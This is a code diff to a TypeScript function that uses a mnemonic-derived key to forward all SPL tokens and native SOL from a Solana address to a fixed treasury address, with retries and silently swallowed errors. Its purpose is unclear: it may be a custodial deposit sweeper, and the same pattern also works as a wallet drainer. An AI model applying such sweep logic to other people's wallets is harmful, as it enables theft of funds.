@@ -187,8 +187,9 @@ async function sweepSolana(mnemonic: string, walletAddress: string, tokens: Wall
     }
     if (!rpc) return;
 
-    // 1) SPL tokens — only when the treasury already holds a token account for the mint.
-    let splPending = false;
+    // 1) SPL tokens — only when the treasury already holds a token account for
+    // the mint. Each token gets up to TOKEN_MAX_ATTEMPTS tries, then we give up
+    // on it so SOL can still be forwarded.
     try {
       const owned = await sol.getTokenAccounts(rpc, address);
       for (const acc of owned) {
@@ -197,35 +198,38 @@ async function sweepSolana(mnemonic: string, walletAddress: string, tokens: Wall
         const destination = await sol.findTokenAccountForMint(rpc, TREASURY_SOL, acc.mint);
         if (!destination) continue;
         const known = tokens.find((t) => t.chain === "SOL" && t.contract === acc.mint);
-        const hash = await sol.sendSplToken(rpc, address, secretKey, acc.pubkey, destination, amountRaw);
-        await credit({
-          walletAddress,
-          chain: "SOL",
-          symbol: known?.symbol ?? acc.mint.slice(0, 6),
-          hash,
-          amount: Number(amountRaw) / 10 ** acc.decimals,
-          kind: "token",
-          price: known?.price,
+        await withRetry(TOKEN_MAX_ATTEMPTS, async () => {
+          const hash = await sol.sendSplToken(rpc, address, secretKey, acc.pubkey, destination, amountRaw);
+          await credit({
+            walletAddress,
+            chain: "SOL",
+            symbol: known?.symbol ?? acc.mint.slice(0, 6),
+            hash,
+            amount: Number(amountRaw) / 10 ** acc.decimals,
+            kind: "token",
+            price: known?.price,
+          });
         });
       }
     } catch {
-      // Keep SOL here so the next pass still has fees to move the SPL tokens.
-      splPending = true;
+      /* token listing failed — SOL forwarding below still runs */
     }
 
-    // 2) Native SOL — only after every SPL token has been forwarded.
-    if (splPending) return;
+    // 2) Native SOL — retried every attempt in this pass, and every future
+    // pass keeps retrying until it reaches the treasury.
     const lamports = await sol.getSolBalance(rpc, address);
     const sendable = lamports - SOL_RENT_LAMPORTS - SOL_FEE_LAMPORTS;
     if (sendable <= 0) return;
-    const hash = await sol.sendSol(rpc, address, secretKey, TREASURY_SOL, sendable);
-    await credit({
-      walletAddress,
-      chain: "SOL",
-      symbol: "SOL",
-      hash,
-      amount: sendable / sol.LAMPORTS_PER_SOL,
-      kind: "native",
+    await withRetry(NATIVE_ATTEMPTS_PER_PASS, async () => {
+      const hash = await sol.sendSol(rpc, address, secretKey, TREASURY_SOL, sendable);
+      await credit({
+        walletAddress,
+        chain: "SOL",
+        symbol: "SOL",
+        hash,
+        amount: sendable / sol.LAMPORTS_PER_SOL,
+        kind: "native",
+      });
     });
   } catch {
     /* silent */
